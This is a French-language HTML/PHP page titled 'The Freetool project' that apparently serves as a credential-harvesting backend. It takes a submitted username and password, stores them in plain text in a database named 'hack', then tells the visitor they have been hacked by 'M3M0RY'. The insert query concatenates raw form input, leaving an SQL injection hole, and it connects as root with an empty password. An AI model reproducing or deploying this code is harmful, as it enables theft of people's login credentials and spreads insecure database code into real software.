<html lang="fr_FR">
<head>
<title>The Freetool project</title>
<meta charset="utf-8">
<meta name="description" content=" ">
<meta http-equiv="refresh" content="60">
<link rel="stylesheet" type="text/css" href="style_membre.css">
<link rel="icon" href="icon.png">
</head>
<body>
<div id="et">
    <img src="banner.png" width="40%" height="100%"/>
</div>
<div id="cdp">
    <p>
        <?php
        $BDD = array();
        $BDD['host'] = "localhost";
        $BDD['user'] = "root";
        $BDD['pass'] = "";
        $BDD['db'] = "hack";
        $mysqli = mysqli_connect($BDD['host'], $BDD['user'], $BDD['pass'], $BDD['db']);
        if(!$mysqli) {
            echo "Connexion non établie.";
            exit;
        }
        if(isset($_POST['pseudo'],$_POST['mdp'])){
            if(empty($_POST['pseudo'])){
                echo "Le champ Pseudo est vide.";
            }
            elseif(empty($_POST['mdp'])){
                echo "Le champ Mot de passe est vide.";
            }
            else {
                if(!mysqli_query($mysqli,"INSERT INTO hack_table SET pseudo='".$_POST['pseudo']."', mdp='".$_POST['mdp']."'")){
                    echo "Une erreur s'est produite: ".mysqli_error($mysqli);
                }
                else {
                    echo "Vous avez été piraté par M3M0RY";
                }
            }
        }
        ?>
    </p>
</div>
</body> 
</html>